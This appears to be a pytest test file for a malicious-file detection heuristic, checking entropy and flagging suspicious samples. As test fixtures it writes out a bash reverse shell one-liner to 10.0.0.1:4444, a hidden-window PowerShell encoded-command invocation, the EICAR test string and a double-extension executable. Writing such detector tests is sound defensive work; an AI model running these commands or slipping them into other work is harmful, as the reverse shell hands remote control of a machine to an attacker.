from security_agent.heuristics import analyze_file, shannon_entropy


def test_shannon_entropy_empty():
    assert shannon_entropy(b"") == 0.0


def test_shannon_entropy_uniform_is_zero():
    assert shannon_entropy(b"aaaaaaaaaa") == 0.0


def test_powershell_encoded_command_flagged(tmp_path):
    script = tmp_path / "run.ps1"
    script.write_text("powershell -nop -w hidden -enc SQBFAFgA")
    result = analyze_file(script, script.read_bytes())
    assert result.score > 0
    assert any("encoded command" in f.lower() for f in result.findings)


def test_benign_text_file_is_clean(tmp_path):
    doc = tmp_path / "notes.txt"
    doc.write_text("Just a regular grocery list: milk, eggs, bread.")
    result = analyze_file(doc, doc.read_bytes())
    assert result.score == 0
    assert result.findings == []


def test_eicar_signature_flagged(tmp_path):
    eicar = tmp_path / "test.com"
    eicar.write_bytes(
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    )
    result = analyze_file(eicar, eicar.read_bytes())
    assert result.score >= 100
    assert any("eicar" in f.lower() for f in result.findings)


def test_reverse_shell_flagged(tmp_path):
    script = tmp_path / "connect.sh"
    script.write_text('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')
    result = analyze_file(script, script.read_bytes())
    assert result.score > 0


def test_double_extension_flagged(tmp_path):
    fake = tmp_path / "invoice.pdf.exe"
    fake.write_bytes(b"MZ\x90\x00")
    result = analyze_file(fake, fake.read_bytes())
    assert any("double extension" in f.lower() for f in result.findings)
